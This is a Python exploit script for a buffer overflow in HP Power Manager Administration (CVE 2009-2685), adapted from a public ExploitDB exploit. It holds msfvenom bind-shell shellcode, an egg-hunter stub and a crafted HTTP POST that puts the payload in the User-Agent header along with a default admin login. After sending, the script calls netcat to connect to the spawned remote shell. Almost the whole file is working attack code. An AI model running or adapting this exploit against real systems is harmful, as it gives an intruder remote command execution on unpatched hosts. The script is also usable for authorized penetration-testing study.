#!/usr/bin/python
# HP Power Manager Administration Universal Buffer Overflow Exploit
# CVE 2009-2685
# Tested on Windows 7 Ultimate,based on ExploitDB Exploit 10099 developed by Matteo Memelli ryujin Matteo Memelli ryujin __A-T__ offensive-security.com
#Tweaked by Harjeet Sharma
# This Exploit use the concept of EGG Hunter as buffer size is small,
# Egg Hunter technique will inject small shell code then this small shell code will search for our large payload/shellcode.
#More Info for this can be found at https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/
#https://security.stackexchange.com/questions/173674/buffer-overflow-doesnt-have-enough-space-for-exploit-after-being-crashed

import sys
from socket import *
import time
import os


print "HP Power Manager Administration Universal Buffer Overflow Exploit"
print "May the force be with you...."

try:
   HOST  = sys.argv[1]
except IndexError:
   print "Usage: hp.py <remote-ip> "
   sys.exit()

PORT  = 80
RET   = "\xCF\xBC\x08\x76" # 7608BCCF JMP ESP MSVCP60.dll

#msfvenom -p windows/shell_bind_tcp LHOST=X.X.X.X LPORT=1234  EXITFUNC=thread -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" x86/alpha_mixed --platform windows -f python
# Size of this payload is 352 Bytes

#Adding TAG harjharj so egghunter can find it

egg="harjharj"
buf= egg
buf += "\x31\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\x93\x85\x8e\x92\x83\xee\xfc\xe2\xf4\x6f\x6d"
buf += "\x0c\x92\x93\x85\xee\x1b\x76\xb4\x4e\xf6\x18\xd5\xbe"
buf += "\x19\xc1\x89\x05\xc0\x87\x0e\xfc\xba\x9c\x32\xc4\xb4"
buf += "\xa2\x7a\x22\xae\xf2\xf9\x8c\xbe\xb3\x44\x41\x9f\x92"
buf += "\x42\x6c\x60\xc1\xd2\x05\xc0\x83\x0e\xc4\xae\x18\xc9"
buf += "\x9f\xea\x70\xcd\x8f\x43\xc2\x0e\xd7\xb2\x92\x56\x05"
buf += "\xdb\x8b\x66\xb4\xdb\x18\xb1\x05\x93\x45\xb4\x71\x3e"
buf += "\x52\x4a\x83\x93\x54\xbd\x6e\xe7\x65\x86\xf3\x6a\xa8"
buf += "\xf8\xaa\xe7\x77\xdd\x05\xca\xb7\x84\x5d\xf4\x18\x89"
buf += "\xc5\x19\xcb\x99\x8f\x41\x18\x81\x05\x93\x43\x0c\xca"
buf += "\xb6\xb7\xde\xd5\xf3\xca\xdf\xdf\x6d\x73\xda\xd1\xc8"
buf += "\x18\x97\x65\x1f\xce\xed\xbd\xa0\x93\x85\xe6\xe5\xe0"
buf += "\xb7\xd1\xc6\xfb\xc9\xf9\xb4\x94\x7a\x5b\x2a\x03\x84"
buf += "\x8e\x92\xba\x41\xda\xc2\xfb\xac\x0e\xf9\x93\x7a\x5b"
buf += "\xf8\x9b\xdc\xde\x70\x6e\xc5\xde\xd2\xc3\xed\x64\x9d"
buf += "\x4c\x65\x71\x47\x04\xed\x8c\x92\x97\x57\x07\x74\xf9"
buf += "\x95\xd8\xc5\xfb\x47\x55\xa5\xf4\x7a\x5b\xc5\xfb\x32"
buf += "\x67\xaa\x6c\x7a\x5b\xc5\xfb\xf1\x62\xa9\x72\x7a\x5b"
buf += "\xc5\x04\xed\xfb\xfc\xde\xe4\x71\x47\xfb\xe6\xe3\xf6"
buf += "\x93\x0c\x6d\xc5\xc4\xd2\xbf\x64\xf9\x97\xd7\xc4\x71"
buf += "\x78\xe8\x55\xd7\xa1\xb2\x93\x92\x08\xca\xb6\x83\x43"
buf += "\x8e\xd6\xc7\xd5\xd8\xc4\xc5\xc3\xd8\xdc\xc5\xd3\xdd"
buf += "\xc4\xfb\xfc\x42\xad\x15\x7a\x5b\x1b\x73\xcb\xd8\xd4"
buf += "\x6c\xb5\xe6\x9a\x14\x98\xee\x6d\x46\x3e\x6e\x8f\xb9"
buf += "\x8f\xe6\x34\x06\x38\x13\x6d\x46\xb9\x88\xee\x99\x05"
buf += "\x75\x72\xe6\x80\x35\xd5\x80\xf7\xe1\xf8\x93\xd6\x71"
buf += "\x47"


#Creating small egg Hunter with name "hunter" with tag "harj"
#tools/exploit/egghunter.rb -f python -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" -e harj -v 'hunter'

hunter =  ""
hunter += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e"
hunter += "\x3c\x05\x5a\x74\xef\xb8\x68\x61\x72\x6a\x89\xd7"
hunter += "\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

#lets make a POST HTTP Request,Main Shellcode we will be injecting in User-Agent Field.
evil =  "POST http://%s/goform/formLogin HTTP/1.1\r\n"
evil += "Host: %s\r\n"
evil += "User-Agent: %s\r\n"
evil += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
evil += "Accept-Language: en-us,en;q=0.5\r\n"
evil += "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
evil += "Keep-Alive: 300\r\n"
evil += "Proxy-Connection: keep-alive\r\n"
evil += "Referer: http://%s/index.asp\r\n"
evil += "Content-Type: application/x-www-form-urlencoded\r\n"
evil += "Content-Length: 678\r\n\r\n"
evil += "HtmlOnly=true&Password=admin&loginButton=Submit+Login&Login=admin"
evil += "\x41"*256 + RET + "\x90"*32 + hunter + "\x42"*287 + "\x0d\x0a"
evil = evil % (HOST,HOST,buf,HOST)

#Now we have the payload ready,lets go for kill

s = socket(AF_INET, SOCK_STREAM)
s.connect((HOST, PORT))
print '[+] Sending evil buffer...'
s.send(evil)
print s.recv(1024)
print "[+] Sent!"
print " Wait for few seconds,spawning the shell for you... "
time.sleep(30)
print "[*] Using netcat to connect %s over port 1234 " % HOST
os.system("nc -nv " + HOST +" 1234")
s.close()
